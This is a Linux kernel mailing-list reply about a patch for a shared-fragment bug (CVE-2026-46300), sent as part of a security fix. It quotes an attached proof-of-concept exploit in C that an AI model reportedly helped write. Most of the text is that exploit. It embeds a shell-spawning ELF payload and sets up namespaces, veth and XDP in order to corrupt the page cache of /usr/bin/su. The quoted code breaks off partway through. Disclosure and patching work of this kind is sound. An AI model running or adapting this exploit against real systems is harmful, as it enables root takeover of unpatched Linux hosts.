Return-Path: <stable+bounces-247158-lists+stable=lfdr.de@vger.kernel.org>
Delivered-To: lists+stable@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id UJMwI4OUBWpLYwIAu9opvQ
	(envelope-from <stable+bounces-247158-lists+stable=lfdr.de@vger.kernel.org>)
	for <lists+stable@lfdr.de>; Thu, 14 May 2026 11:23:15 +0200
X-Original-To: lists+stable@lfdr.de
Received: from sto.lore.kernel.org (sto.lore.kernel.org [172.232.135.74])
	by mail.lfdr.de (Postfix) with ESMTPS id 2EC6353FB8D
	for <lists+stable@lfdr.de>; Thu, 14 May 2026 11:23:14 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sto.lore.kernel.org (Postfix) with ESMTP id A649F3011EBA
	for <lists+stable@lfdr.de>; Thu, 14 May 2026 09:23:12 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 9542639DBE6;
	Thu, 14 May 2026 09:23:11 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="iQ5hxuRP"
X-Original-To: stable@vger.kernel.org
Received: from mail-pj1-f48.google.com (mail-pj1-f48.google.com [209.85.216.48])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E98A4224AF7
	for <stable@vger.kernel.org>; Thu, 14 May 2026 09:23:08 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.48
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1778750591; cv=none; b=n9rgEjFqEYIbqOvsXdTMhiLxZ02X7RDH7TXZvoXsg7PAslJY4phssJatu3yFuCuZziW9/aVF9iXDn7T+UC4ge1jOEm8JxymllMc1M47QhqiRQy0Hm0JQ3DgOQxZ8o+0J53Y/hIUWTWC4xKtk+VS2/SFEwt5npV08GVwRv3imbH8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1778750591; c=relaxed/simple;
	bh=7e5UAnvNfVXDKZfaAd5twH9/Jp+934cnV4mM6/4QD1w=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=QAzmzxi17ZkphdEP5kqYYkjlshJFjpel0+0kMx4+5ErenapYBo9sqIKlRW23Gbd2fPiCpykV4eN/wuKrI8iGxraZjXo+GWGyAfIsUZOSebYJ/wmyxG+Te4rjIPXTSI9a0pdT8Cs9JOKaj2ALkJg3vCKKwQT3qF9Gk3g/onNobWs=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=iQ5hxuRP; arc=none smtp.client-ip=209.85.216.48
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-pj1-f48.google.com with SMTP id 98e67ed59e1d1-366139223e4so4741345a91.0
        for <stable@vger.kernel.org>; Thu, 14 May 2026 02:23:08 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1778750588; x=1779355388; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=YTo95gmbrgbQook/kBZqCdBGvj8PpS+QjOCkSgoMewk=;
        b=iQ5hxuRPqCP8vtQsqIXspdUdLHzY5We6C3ds49YoXzhd1VopyctynsYuq1AIEbIBRG
         ArWWQx6lcQnJ6uEhNWLNfuIW4YHN8Kse7LKJk247zJfc4rEET9vFwhg18M3c68MfYcUs
         NQUVHmPIzevtpr6TLzFtNFiw3Rc4kXzdx1w4QVdsZEdGNGt4qM8YPLeKWrQBlQ2Az9ra
         l15J4pDWOqZ408vnpkWXR3ipfzLASmFG6Jg1p+M5ZSayW+9HBx/yUisHRocDnQLfUcpD
         QUkhYvewbVS74vC6zwZO79pUZdkliItDaDdBcm6ygT7NTYvqoqjdCBTi+ciRnf5mlQ/2
         7v1w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1778750588; x=1779355388;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=YTo95gmbrgbQook/kBZqCdBGvj8PpS+QjOCkSgoMewk=;
        b=M+DHSYvkAmhT8B/oavkEQUwipOVM70JG/X07RR4VVnig+e/dkPqF8MHbQ8LGwyKyO5
         llKv4BqEWp5bu1iGyQ5f/fkWvqSg2f97Mjr/Z5STEp0nCgPIGGvUurJC5u3c91aNL0v+
         Iyz1FXYhmxQFCDbUZPeCNmAh31ZTu6mkZZIViEMjF200PRa9oT0ESP28ISUVVxeplaYm
         ugBEBafUjT1Vq9ii0oe/Rnc+O7EUz3G1a81pySruxcIr1Ip02HNhp5Ea9R+qQSwFkpb9
         1td0oqZ8WVCxVrv2qAQRjgcf4YMdlqAP/P+QBh15jlt92SfSo/t/q0QoGmS8yjsbUupp
         e22Q==
X-Forwarded-Encrypted: i=1; AFNElJ8vOiHL5BSX4TsGludQYIrxNSC/CjaVGdOF95LV6ZisrWtnsm3H/39qW01LDLAEP7B2AZghOXc=@vger.kernel.org
X-Gm-Message-State: AOJu0YyzYPpFE9UeMuUatQkFwqTH0Zl++5to1D9W89AyEHY5HKDqKhGN
	i90MjUj70nJsLZnvgWrDewcXqRW6HBoC4AZr4bdi1UZGc5TacKIemsru
X-Gm-Gg: Acq92OE0Zc+7sUSIMV0c7NdIhYUdP1y60OSCAXXLgV7PVWvWjzdrDC2fmc+Y4g1Gf0e
	cxAmfgzbGGVILBHPkLdKCqBSKU0kLiVOr5ZQko0mp+R2/ydKGOGJXRs/fOnbMljeA4eU5p1KzSA
	c1au3wIvEcpIqw0v8XGITnZt4ZYvhje6+R8ZGH2NHWJXgVX5uwwhPr044943lbhAfDizHkXKs78
	ug5geqEaALGcqHTskKwQU6c5+IgbZo9EYbyxCFRLX6IyMGZI4oYrOhv5ipm/bZ1ByKQLJCjOGxE
	WuKjPC5i+qO0s9aNVivhDXJt//cH2GBxaj1/zaf5CkQ6KugljPI0rYZhC0+xWfJ2uOoh2zMwoAv
	iPw6W+/ohKA6wwfo0J8Cvu5rRKYm2VPLHjFwQ87OiCWo6Qy2/O8N9nAFoiyUXhYBGCnwJCDar3X
	jPSAl5jb93eZg5opWyRLTO550ynRnaH/e9zfGXlzDdaVE=
X-Received: by 2002:a17:90a:fc44:b0:366:aba:4c86 with SMTP id 98e67ed59e1d1-368f3e62d47mr8134769a91.27.1778750587204;
        Thu, 14 May 2026 02:23:07 -0700 (PDT)
Received: from v4bel ([58.123.110.97])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-c82bb062695sm1719348a12.4.2026.05.14.02.23.03
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 14 May 2026 02:23:06 -0700 (PDT)
Date: Thu, 14 May 2026 18:23:02 +0900
From: Hyunwoo Kim <imv4bel@gmail.com>
To: Sultan Alsawaf <sultan@kerneltoast.com>
Cc: davem@davemloft.net, edumazet@google.com, kuba@kernel.org,
	pabeni@redhat.com, horms@kernel.org, kerneljasonxing@gmail.com,
	kuniyu@google.com, mhal@rbox.co, jiayuan.chen@linux.dev,
	steffen.klassert@secunet.com, vakzz@zellic.io, ben@decadent.org.uk,
	herbert@gondor.apana.org.au, dsahern@kernel.org,
	netdev@vger.kernel.org, stable@vger.kernel.org, imv4bel@gmail.com
Subject: Re: [PATCH net v2] net: skbuff: propagate shared-frag marker through
 frag-transfer helpers
Message-ID: <agWUdie1xBvBu22I@v4bel>
References: <agToIEDI4TaTNLRb@v4bel>
 <agVpIsaSherjHTYg@sultan-box>
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <agVpIsaSherjHTYg@sultan-box>
X-Rspamd-Queue-Id: 2EC6353FB8D
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [-1.66 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	MID_RHS_NOT_FQDN(0.50)[];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	R_SPF_ALLOW(-0.20)[+ip4:172.232.135.74:c];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	RCVD_TLS_LAST(0.00)[];
	TAGGED_FROM(0.00)[bounces-247158-lists,stable=lfdr.de];
	FORGED_SENDER_MAILLIST(0.00)[];
	MIME_TRACE(0.00)[0:+];
	FREEMAIL_CC(0.00)[davemloft.net,google.com,kernel.org,redhat.com,gmail.com,rbox.co,linux.dev,secunet.com,zellic.io,decadent.org.uk,gondor.apana.org.au,vger.kernel.org];
	FREEMAIL_FROM(0.00)[gmail.com];
	RCPT_COUNT_TWELVE(0.00)[18];
	FROM_HAS_DN(0.00)[];
	MISSING_XM_UA(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[imv4bel@gmail.com,stable@vger.kernel.org];
	DKIM_TRACE(0.00)[gmail.com:+];
	NEURAL_HAM(-0.00)[-1.000];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TAGGED_RCPT(0.00)[stable];
	TO_DN_SOME(0.00)[];
	ASN(0.00)[asn:63949, ipnet:172.232.128.0/19, country:SG];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sto.lore.kernel.org:helo,sto.lore.kernel.org:rdns,anthropic.com:email,kerneltoast.com:email]
X-Rspamd-Action: no action

On Wed, May 13, 2026 at 11:18:10PM -0700, Sultan Alsawaf wrote:
> On Thu, May 14, 2026 at 06:07:44AM +0900, Hyunwoo Kim wrote:
> > Changes in v2:
> > - Also propagate SHARED_FRAG in skb_shift()
> > - v1: https://lore.kernel.org/all/agRfuVOeMI5pbHhY@v4bel/
> 
> Hi Hyunwoo,
> 
> I've been working on mitigating this vulnerability as a member of the kernel
> team at CIQ, a distro vendor. In particular, we wanted to make sure that there
> weren't any lingering places missing SHARED_FRAG propagation.
> 
> To that end, I used Claude to discover that skb_gro_receive() remained unpatched
> (as you pointed out in the v1 thread). And then I generated a PoC exploiting the
> vulnerable skb_gro_receive() path.
> 
> The PoC is a modified version of the original fragnesia PoC. It works 100% of
> the time, just like the original fragnesia PoC.
> 
> I have attached the PoC and a patch that fixes skb_gro_receive(). Please take a
> look at them.
> 
> Thanks,
> Sultan

Nice catch. Thank you.

After testing, I plan to merge your patch with v2 into a single patch (not a 
series) and submit it as v3. I would appreciate it if you could then add an 
appropriate credit tag of your own.

Also, I would appreciate it if you could use AI to explore additional 
propagation variant paths. From my own analysis, no further ones have been 
identified.


Best regards,
Hyunwoo Kim


> /*
>  * fragnesia-gro.c: skb_gro_receive() SKBFL_SHARED_FRAG page-cache corruption PoC
>  *
>  * Drop-in replacement for the espintcp fragnesia variant, targeting the same
>  * bug class (CVE-2026-46300) through the GRO frag-merge path instead of the
>  * espintcp path. Copies shell_elf over /usr/bin/su's page cache the same way
>  * the original fragnesia does.
>  *
>  * The exploit splices 17 bytes per round (1 byte ciphertext + 16 byte ICV) so
>  * each ESP decrypt corrupts exactly ONE target byte with no collateral damage.
>  * A precomputed IV table selects the AES-GCM keystream byte that XORs the
>  * current file content to the desired shell_elf byte.
>  *
>  * Based on the Fragnesia PoC by William Bowling / Hyunwoo Kim.
>  *
>  * Build:
>  *   gcc -O2 -Wall -Wextra -static fragnesia-gro.c -o fragnesia-gro
>  *
>  * Run (as root):
>  *   ./fragnesia-gro
>  *
>  * Exit codes:
>  *   1: vulnerable (page cache mutated through GRO flag-strip path)
>  *   0: fixed (byte unchanged)
>  *   2: local setup or argument error
>  *   4: namespace/veth gate closed
>  */
> 
> #define _GNU_SOURCE
> 
> #include <arpa/inet.h>
> #include <errno.h>
> #include <fcntl.h>
> #include <limits.h>
> #include <net/if.h>
> #include <netinet/in.h>
> #include <sched.h>
> #include <signal.h>
> #include <stdbool.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/ioctl.h>
> #include <sys/mount.h>
> #include <sys/socket.h>
> #include <sys/stat.h>
> #include <sys/syscall.h>
> #include <sys/types.h>
> #include <time.h>
> #include <sys/wait.h>
> #include <unistd.h>
> #include <linux/bpf.h>
> #include <linux/if_addr.h>
> #include <linux/if_alg.h>
> #include <linux/netlink.h>
> #include <linux/xfrm.h>
> 
> /* ---- compat defines ---- */
> 
> #ifndef NLA_ALIGNTO
> #define NLA_ALIGNTO 4
> #endif
> #define NLA_ALIGN(len)  (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
> #ifndef NLA_HDRLEN
> #define NLA_HDRLEN      ((int)NLA_ALIGN(sizeof(struct nlattr)))
> #endif
> #ifndef RTM_NEWLINK
> #define RTM_NEWLINK 16
> #endif
> #ifndef RTM_NEWADDR
> #define RTM_NEWADDR 20
> #endif
> #ifndef NETLINK_ROUTE
> #define NETLINK_ROUTE 0
> #endif
> #ifndef NETLINK_XFRM
> #define NETLINK_XFRM 6
> #endif
> #ifndef IFLA_IFNAME
> #define IFLA_IFNAME 3
> #endif
> #ifndef IFLA_LINKINFO
> #define IFLA_LINKINFO 18
> #endif
> #ifndef IFLA_INFO_KIND
> #define IFLA_INFO_KIND 1
> #endif
> #ifndef IFLA_INFO_DATA
> #define IFLA_INFO_DATA 2
> #endif
> #ifndef VETH_INFO_PEER
> #define VETH_INFO_PEER 1
> #endif
> #ifndef IFLA_NET_NS_PID
> #define IFLA_NET_NS_PID 19
> #endif
> #ifndef IFA_LOCAL
> #define IFA_LOCAL 2
> #endif
> #ifndef IFA_ADDRESS
> #define IFA_ADDRESS 1
> #endif
> #ifndef NLA_F_NESTED
> #define NLA_F_NESTED (1 << 15)
> #endif
> #ifndef ETHTOOL_SGRO
> #define ETHTOOL_SGRO 0x0000002c
> #endif
> #ifndef ETHTOOL_STSO
> #define ETHTOOL_STSO 0x0000001f
> #endif
> #ifndef ETHTOOL_SGSO
> #define ETHTOOL_SGSO 0x00000024
> #endif
> #ifndef SIOCETHTOOL
> #define SIOCETHTOOL 0x8946
> #endif
> #ifndef UDP_ENCAP
> #define UDP_ENCAP 100
> #endif
> #ifndef UDP_ENCAP_ESPINUDP
> #define UDP_ENCAP_ESPINUDP 2
> #endif
> #ifndef UDP_GRO
> #define UDP_GRO 104
> #endif
> #ifndef UDP_CORK
> #define UDP_CORK 1
> #endif
> #ifndef AF_ALG
> #define AF_ALG 38
> #endif
> #ifndef SOL_ALG
> #define SOL_ALG 279
> #endif
> #ifndef ALG_SET_KEY
> #define ALG_SET_KEY 1
> #endif
> #ifndef ALG_SET_OP
> #define ALG_SET_OP 3
> #endif
> #ifndef ALG_OP_ENCRYPT
> #define ALG_OP_ENCRYPT 1
> #endif
> #ifndef IFLA_XDP
> #define IFLA_XDP 43
> #endif
> #ifndef IFLA_XDP_FD
> #define IFLA_XDP_FD 1
> #endif
> #ifndef IFLA_XDP_FLAGS
> #define IFLA_XDP_FLAGS 3
> #endif
> #ifndef XDP_FLAGS_SKB_MODE
> #define XDP_FLAGS_SKB_MODE (1U << 1)
> #endif
> 
> struct rtnl_ifinfomsg {
> 	unsigned char  ifi_family;
> 	unsigned char  __ifi_pad;
> 	unsigned short ifi_type;
> 	int            ifi_index;
> 	unsigned int   ifi_flags;
> 	unsigned int   ifi_change;
> };
> 
> /* ---- constants ---- */
> 
> #define VETH0       "veth0"
> #define VETH1       "veth1"
> #define ADDR_SRC    "10.0.0.1"
> #define ADDR_DST    "10.0.0.2"
> #define UDP_PORT    4500
> #define ESP_SPI     0x100
> #define ICV_LEN     16
> #define PAYLOAD_LEN 192
> /*
>  * Splice exactly 17 bytes per round: rfc4106 shifts the 8-byte IV into
>  * the AAD, so the inner GCM sees SPLICE_LEN bytes of ciphertext. With
>  * SPLICE_LEN - ICV_LEN = 1, exactly one frag byte is decrypted.
>  */
> #define SPLICE_LEN  (1 + ICV_LEN)
> 
> static const unsigned char xfrm_key[20] = {
> 	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
> 	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
> 	0x01, 0x02, 0x03, 0x04
> };
> 
> static const uint8_t shell_elf[PAYLOAD_LEN] = {
> 	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
> 	0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
> 	0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
> 	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
> 	0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
> 	0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
> 	0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
> 	0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
> 	0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
> 	0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
> 	0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
> 	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
> };
> 
> static const char *target_file = "/usr/bin/su";
> 
> /* ---- utility ---- */
> 
> static void die(const char *w) { fprintf(stderr, "%s: %s\n", w, strerror(errno)); exit(2); }
> static void gate_fail(const char *w) { fprintf(stderr, "gate_closed: %s: %s\n", w, strerror(errno)); exit(4); }
> 
> static void store_be32(unsigned char *p, uint32_t v)
> {
> 	p[0] = v >> 24; p[1] = v >> 16; p[2] = v >> 8; p[3] = v;
> }
> 
> static void sync_write(int fd) { unsigned char b = 1; if (write(fd, &b, 1) != 1) die("sync_write"); }
> static void sync_read(int fd)  { unsigned char b; if (read(fd, &b, 1) != 1) die("sync_read"); }
> 
> static unsigned char read_byte_at(int fd, off_t off)
> {
> 	unsigned char b;
> 	if (pread(fd, &b, 1, off) != 1) die("pread");
> 	return b;
> }
> 
> /* ---- netlink helpers ---- */
> 
> static int nl_ack_errno(char *buf, ssize_t len)
> {
> 	struct nlmsghdr *nlh;
> 	for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
> 	     nlh = NLMSG_NEXT(nlh, len)) {
> 		if (nlh->nlmsg_type == NLMSG_ERROR) {
> 			struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nlh);
> 			if (e->error == 0) return 0;
> 			errno = -e->error;
> 			return -1;
> 		}
> 	}
> 	errno = EPROTO;
> 	return -1;
> }
> 
> static void add_nlattr(struct nlmsghdr *nlh, size_t max,
> 		       unsigned short type, const void *data, size_t len)
> {
> 	size_t off = NLMSG_ALIGN(nlh->nlmsg_len);
> 	struct nlattr *nla = (struct nlattr *)((char *)nlh + off);
> 	if (off + NLA_HDRLEN + len > max) { fprintf(stderr, "nlmsg overflow\n"); exit(2); }
> 	nla->nla_type = type;
> 	nla->nla_len = NLA_HDRLEN + len;
> 	memcpy((char *)nla + NLA_HDRLEN, data, len);
> 	nlh->nlmsg_len = off + NLA_ALIGN(nla->nla_len);
> }
> 
> static struct nlattr *nest_begin(struct nlmsghdr *nlh, size_t max, unsigned short type)
> {
> 	size_t off = NLMSG_ALIGN(nlh->nlmsg_len);
> 	struct nlattr *nla = (struct nlattr *)((char *)nlh + off);
> 	if (off + NLA_HDRLEN > max) { fprintf(stderr, "nlmsg overflow\n"); exit(2); }
> 	nla->nla_type = type;
> 	nla->nla_len = NLA_HDRLEN;
> 	nlh->nlmsg_len = off + NLA_HDRLEN;
> 	return nla;
> }
> 
> static void nest_end(struct nlmsghdr *nlh, struct nlattr *nla)
> {
> 	nla->nla_len = (unsigned short)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len) - (char *)nla);
> }
> 
> static void nl_talk(struct nlmsghdr *nlh, int proto, const char *label)
> {
> 	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
> 	char resp[4096];
> 	int fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, proto);
> 	if (fd < 0) gate_fail(label);
> 	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) gate_fail(label);
> 	memset(&sa, 0, sizeof(sa));
> 	sa.nl_family = AF_NETLINK;
> 	if (sendto(fd, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) gate_fail(label);
> 	ssize_t r = recv(fd, resp, sizeof(resp), 0);
> 	if (r < 0 || nl_ack_errno(resp, r) < 0) gate_fail(label);
> 	close(fd);
> }
> 
> /* ---- network setup ---- */
> 
> static void if_up(const char *name)
> {
> 	struct ifreq ifr = {};
> 	int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
> 	if (fd < 0) gate_fail("socket");
> 	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
> 	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) gate_fail(name);
> 	ifr.ifr_flags |= IFF_UP;
> 	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) gate_fail(name);
> 	close(fd);
> }
> 
> static void create_veth(void)
> {
> 	char buf[4096] = {};
> 	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtnl_ifinfomsg));
> 	nlh->nlmsg_type = RTM_NEWLINK;
> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
> 	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_family = AF_UNSPEC;
> 	add_nlattr(nlh, sizeof(buf), IFLA_IFNAME, VETH0, strlen(VETH0) + 1);
> 	struct nlattr *li = nest_begin(nlh, sizeof(buf), IFLA_LINKINFO | NLA_F_NESTED);
> 	add_nlattr(nlh, sizeof(buf), IFLA_INFO_KIND, "veth", 5);
> 	struct nlattr *id = nest_begin(nlh, sizeof(buf), IFLA_INFO_DATA | NLA_F_NESTED);
> 	struct nlattr *pn = nest_begin(nlh, sizeof(buf), VETH_INFO_PEER | NLA_F_NESTED);
> 	{ size_t o = NLMSG_ALIGN(nlh->nlmsg_len);
> 	  memset((char *)nlh + o, 0, sizeof(struct rtnl_ifinfomsg));
> 	  nlh->nlmsg_len = o + sizeof(struct rtnl_ifinfomsg); }
> 	add_nlattr(nlh, sizeof(buf), IFLA_IFNAME, VETH1, strlen(VETH1) + 1);
> 	nest_end(nlh, pn); nest_end(nlh, id); nest_end(nlh, li);
> 	nl_talk(nlh, NETLINK_ROUTE, "create veth");
> }
> 
> static void move_to_netns(const char *name, pid_t pid)
> {
> 	char buf[4096] = {};
> 	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
> 	uint32_t ns_pid = (uint32_t)pid;
> 	unsigned int idx = if_nametoindex(name);
> 	if (!idx) gate_fail("if_nametoindex");
> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtnl_ifinfomsg));
> 	nlh->nlmsg_type = RTM_NEWLINK;
> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
> 	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_family = AF_UNSPEC;
> 	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_index = (int)idx;
> 	add_nlattr(nlh, sizeof(buf), IFLA_NET_NS_PID, &ns_pid, sizeof(ns_pid));
> 	nl_talk(nlh, NETLINK_ROUTE, "move veth");
> }
> 
> static void add_addr(const char *name, const char *addr)
> {
> 	char buf[4096] = {};
> 	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
> 	struct in_addr a;
> 	unsigned int idx = if_nametoindex(name);
> 	if (!idx) gate_fail("if_nametoindex");
> 	inet_pton(AF_INET, addr, &a);
> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifaddrmsg));
> 	nlh->nlmsg_type = RTM_NEWADDR;
> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
> 	struct ifaddrmsg *ifa = (struct ifaddrmsg *)NLMSG_DATA(nlh);
> 	ifa->ifa_family = AF_INET;
> 	ifa->ifa_prefixlen = 24;
> 	ifa->ifa_index = idx;
> 	add_nlattr(nlh, sizeof(buf), IFA_LOCAL, &a, sizeof(a));
> 	add_nlattr(nlh, sizeof(buf), IFA_ADDRESS, &a, sizeof(a));
> 	nl_talk(nlh, NETLINK_ROUTE, "add addr");
> }
> 
> static void ethtool_set(const char *name, uint32_t cmd, uint32_t data)
> {
> 	struct ifreq ifr = {};
> 	struct { uint32_t cmd; uint32_t data; } val = { cmd, data };
> 	int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
> 	if (fd < 0) return;
> 	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
> 	ifr.ifr_data = (void *)&val;
> 	ioctl(fd, SIOCETHTOOL, &ifr);
> 	close(fd);
> }
> 
> /* ---- XDP attach/detach for NAPI init ---- */
> 
> static void xdp_toggle(const char *name, int prog_fd, uint32_t flags)
> {
> 	char buf[4096] = {};
> 	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
> 	unsigned int idx = if_nametoindex(name);
> 	if (!idx) return;
> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtnl_ifinfomsg));
> 	nlh->nlmsg_type = RTM_NEWLINK;
> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
> 	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_family = AF_UNSPEC;
> 	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_index = (int)idx;
> 	struct nlattr *x = nest_begin(nlh, sizeof(buf), IFLA_XDP | NLA_F_NESTED);
> 	add_nlattr(nlh, sizeof(buf), IFLA_XDP_FD, &prog_fd, sizeof(prog_fd));
> 	add_nlattr(nlh, sizeof(buf), IFLA_XDP_FLAGS, &flags, sizeof(flags));
> 	nest_end(nlh, x);
> 	nl_talk(nlh, NETLINK_ROUTE, "xdp");
> }
> 
> static void enable_veth_napi(const char *name)
> {
> 	struct bpf_insn { uint8_t code; uint8_t regs; int16_t off; int32_t imm; };
> 	struct bpf_insn prog[] = { { 0xb7, 0, 0, 2 }, { 0x95, 0, 0, 0 } };
> 	struct { uint32_t t; uint32_t c; uint64_t i; uint64_t l;
> 		 uint32_t a,b; uint64_t d; uint32_t e,f; char n[16]; } attr = {};
> 	static const char lic[] = "GPL";
> 	attr.t = 6; attr.c = 2;
> 	attr.i = (uint64_t)(unsigned long)prog;
> 	attr.l = (uint64_t)(unsigned long)lic;
> 	int fd = (int)syscall(__NR_bpf, 5, &attr, sizeof(attr));
> 	if (fd < 0) return;
> 	xdp_toggle(name, fd, XDP_FLAGS_SKB_MODE);
> 	close(fd);
> 	int m1 = -1;
> 	xdp_toggle(name, m1, XDP_FLAGS_SKB_MODE);
> }
> 
> /* ---- user namespace ---- */
> 
> static void setup_userns(void)
> {
> 	uid_t uid = getuid();
> 	gid_t gid = getgid();
> 	int rp[2], mp[2];
> 	if (pipe(rp) < 0 || pipe(mp) < 0) die("pipe");
> 	pid_t c = fork();
> 	if (c < 0) die("fork");
> 	if (c == 0) {
> 		char path[64], map[64]; pid_t pp = getppid();
> 		close(rp[1]); close(mp[0]); sync_read(rp[0]);
> 		snprintf(path, sizeof(path), "/proc/%d/setgroups", pp);
> 		int fd = open(path, O_WRONLY); if (fd >= 0) { write(fd, "deny", 4); close(fd); }
> 		snprintf(path, sizeof(path), "/proc/%d/uid_map", pp);
> 		snprintf(map, sizeof(map), "0 %u 1\n", uid);
> 		fd = open(path, O_WRONLY); if (fd >= 0) { write(fd, map, strlen(map)); close(fd); }
> 		snprintf(path, sizeof(path), "/proc/%d/gid_map", pp);
